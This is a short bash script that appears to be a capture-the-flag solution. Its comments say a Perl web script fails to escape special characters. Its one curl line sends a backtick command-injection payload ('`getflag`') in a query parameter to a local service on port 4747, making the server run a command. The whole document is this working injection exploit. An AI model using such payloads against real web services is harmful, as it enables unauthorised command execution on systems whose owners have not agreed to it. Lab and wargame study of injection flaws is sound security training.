#!/bin/bash
# The perl script does not escape special characters.
# Which means we can create a subshell as the argument sent to
# the command in backticks.
curl localhost:4747?x='`getflag`'
